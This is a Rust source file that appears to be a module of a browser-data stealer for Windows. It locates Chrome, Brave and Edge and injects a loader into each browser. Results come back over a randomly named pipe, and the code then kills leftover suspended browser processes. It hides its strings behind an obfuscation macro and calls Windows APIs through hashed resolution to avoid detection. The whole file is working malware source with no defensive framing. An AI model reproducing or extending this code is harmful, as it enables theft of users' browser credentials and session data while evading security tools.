use crate::sprotect;
use crate::api_resolve::HashedAPIs;
use super::{cbrowser, bbrowser, ebrowser, bloader, bpipe};
use winapi::um::{processthreadsapi, tlhelp32, handleapi, winnt};
use winapi::shared::minwindef::{DWORD, FALSE};
use std::ptr;

pub async fn collect() -> Result<(), ()> {
    let mut browsers = Vec::new();
    
    if let Some(path) = cbrowser::find_path() {
        browsers.push((sprotect!("Chrome"), path));
    }
    
    if let Some(path) = bbrowser::find_path() {
        browsers.push((sprotect!("Brave"), path));
    }
    
    if let Some(path) = ebrowser::find_path() {
        browsers.push((sprotect!("Edge"), path));
    }
    
    if browsers.is_empty() {
        return Err(());
    }
    
    
    for (browser_name, browser_path) in browsers {
        let pipe_name = bpipe::generate_pipe_name();
        
        let pipe_handle = match bpipe::create_server(&pipe_name) {
            Some(handle) => handle,
            None => continue,
        };
        
        match bloader::inject_browser(&browser_path, &pipe_name).await {
            Ok(_) => {
                bpipe::run_communication(pipe_handle).await;
            },
            Err(_) => {
                unsafe { winapi::um::handleapi::CloseHandle(pipe_handle); }
            }
        }
        
        unsafe { winapi::um::handleapi::CloseHandle(pipe_handle); }
    }
    
    cleanup_suspended_browsers().await;
    
    Ok(())
}

async fn cleanup_suspended_browsers() {
    let browser_names = vec![
        sprotect!("chrome.exe"),
        sprotect!("brave.exe"),
        sprotect!("msedge.exe"),
        sprotect!("opera.exe"),
        sprotect!("firefox.exe"),
    ];
    
    unsafe {
        let snapshot = HashedAPIs::create_toolhelp32_snapshot(tlhelp32::TH32CS_SNAPPROCESS, 0);
        if snapshot as isize == handleapi::INVALID_HANDLE_VALUE as isize {
            return;
        }
        
        let mut process_entry = tlhelp32::PROCESSENTRY32W {
            dwSize: std::mem::size_of::<tlhelp32::PROCESSENTRY32W>() as DWORD,
            cntUsage: 0,
            th32ProcessID: 0,
            th32DefaultHeapID: 0,
            th32ModuleID: 0,
            cntThreads: 0,
            th32ParentProcessID: 0,
            pcPriClassBase: 0,
            dwFlags: 0,
            szExeFile: [0; 260],
        };
        
        if HashedAPIs::process32_first_w(snapshot, &mut process_entry as *mut _ as *mut std::ffi::c_void) != 0 {
            loop {
                let exe_name = String::from_utf16_lossy(&process_entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_lowercase();
                
                if browser_names.iter().any(|name| exe_name.contains(name)) {
                    let process_handle = HashedAPIs::open_process(
                        winnt::PROCESS_TERMINATE | winnt::PROCESS_QUERY_INFORMATION,
                        FALSE,
                        process_entry.th32ProcessID,
                    );
                    
                    if process_handle != ptr::null_mut() {
                        if is_process_suspended(process_handle as *mut winapi::ctypes::c_void) {
                            HashedAPIs::terminate_process(process_handle, 0);
                        }
                        HashedAPIs::close_handle(process_handle);
                    }
                }
                
                if HashedAPIs::process32_next_w(snapshot, &mut process_entry as *mut _ as *mut std::ffi::c_void) == 0 {
                    break;
                }
            }
        }
        
        HashedAPIs::close_handle(snapshot);
    }
}

unsafe fn is_process_suspended(process_handle: winapi::um::winnt::HANDLE) -> bool {
    let thread_snapshot = tlhelp32::CreateToolhelp32Snapshot(tlhelp32::TH32CS_SNAPTHREAD, 0);
    if thread_snapshot == handleapi::INVALID_HANDLE_VALUE {
        return false;
    }
    
    let mut thread_entry = tlhelp32::THREADENTRY32 {
        dwSize: std::mem::size_of::<tlhelp32::THREADENTRY32>() as DWORD,
        cntUsage: 0,
        th32ThreadID: 0,
        th32OwnerProcessID: 0,
        tpBasePri: 0,
        tpDeltaPri: 0,
        dwFlags: 0,
    };
    
    let process_id = processthreadsapi::GetProcessId(process_handle);
    
    let mut suspended_count = 0;
    let mut total_threads = 0;
    
    if tlhelp32::Thread32First(thread_snapshot, &mut thread_entry) != 0 {
        loop {
            if thread_entry.th32OwnerProcessID == process_id {
                total_threads += 1;
                
                let thread_handle = processthreadsapi::OpenThread(
                    winnt::THREAD_QUERY_INFORMATION,
                    FALSE,
                    thread_entry.th32ThreadID,
                );
                
                if thread_handle != ptr::null_mut() {
                    let mut context = winnt::CONTEXT {
                        ContextFlags: winnt::CONTEXT_CONTROL,
                        ..std::mem::zeroed()
                    };
                    
                    if processthreadsapi::GetThreadContext(thread_handle, &mut context) != 0 {
                        suspended_count += 1;
                    }
                    
                    handleapi::CloseHandle(thread_handle);
                }
            }
            
            if tlhelp32::Thread32Next(thread_snapshot, &mut thread_entry) == 0 {
                break;
            }
        }
    }
    
    handleapi::CloseHandle(thread_snapshot);
    
    total_threads > 0 && suspended_count == total_threads
}